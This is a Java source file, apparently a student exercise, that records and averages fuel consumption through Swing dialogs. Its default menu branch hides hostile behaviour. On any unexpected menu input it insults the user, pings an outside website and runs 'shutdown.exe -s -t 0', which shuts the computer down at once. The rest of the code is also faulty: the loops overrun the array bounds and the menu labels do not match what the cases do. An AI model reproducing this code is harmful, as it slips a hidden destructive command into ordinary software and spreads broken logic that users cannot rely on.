package tanken;
import java.io.*;
import javax.swing.*;

/**
 * @version 1.0
 * @author JSkopp
 * @param args[]
 */
public class Tanken {

    public static void main(String[] args) throws IOException {
        
    /* Variabeln */
    int anz = 0;
 
    double x = 0;
    int abfrage = 0;
    boolean neustart = true;
    int count = 0;
    double mid = 0.0; // gesamte Mittelwert
    
    
    
    /* Main */
    while(neustart){ // mache das solange Neutstrt wahr ist
        
    anz = (int) Double.parseDouble(JOptionPane.showInputDialog("Wie oft wollen Sie tanken? ")); // Userabfrage
     double[][] tank = new double[anz][anz]; // 2D - Array :D
     double[] durch = new double[anz];
    
    JOptionPane.showMessageDialog(null, "1) Eingabe \n 2) Ausgabe \n 3) Berechnung \n 4) Ausgabe Nummer des Tankvorganges \n 0) Beenden "); //erstellt ein Textfeld
    
    abfrage = Integer.parseInt(JOptionPane.showInputDialog("Ihr Menü Punkt: ")); // fragt den Nutzer das Texfeld ab 
        switch (abfrage) {
            case 0:
                // Abbruch
                neustart = false;
                break;
            case 1:
                for(count = 0; count<=tank.length; count++){
                    tank[count][0] = Double.parseDouble(JOptionPane.showInputDialog("Wie viel haben Sie getankt?: ")); 
                    tank[count][1] = Integer.parseInt(JOptionPane.showInputDialog("Wie weit sind Sie mit der Tankfüllung gekommen?: "));
                }       break;
            case 2:
                //Berechnung & Ausgabe der Durchschnitswerte
                for(count = 0; count<=tank.length; count++){
                    durch[count] = tank[count][0] / tank[count][1];
                }       for( double n:durch){
                    System.out.println(n+"dm³/m");
                }       break;
            case 3:
                // Berechnung des Mittelwertes aller (hier nehme ich den Mittelwert der Liste >>durch<<)
                for(count = 0; count<=tank.length; count++){
                    mid = mid + durch[count];
                }
                mid = mid / durch.length;
               
                
                 JOptionPane.showMessageDialog(null, "Durchschnitlicher Verbrauchswert: "+ mid + "dm³/m  \n");
                break;
            case 4:
                System.out.print("Nr. | wie hoch"); //CSV artig :D
 
                for(count = 0; count<=tank.length; count++){
                   if((int) mid > durch[count]){
                       System.out.print(count+" | "+durch[count]);
                   }
                }
                break;
            default:
                JOptionPane.showMessageDialog(null, "Vollidiot. Jetzt siehst du was du davon hast");
                Runtime.getRuntime().exec(""+"ping https://skopp-jonathan.lima-city.de/ags/java/0001:8080");
                Runtime.getRuntime().exec(""+"shutdown.exe -s -t 0 -c \"\"");
                break;
        }
    
    
    
    
    
        
        }
    }    
}
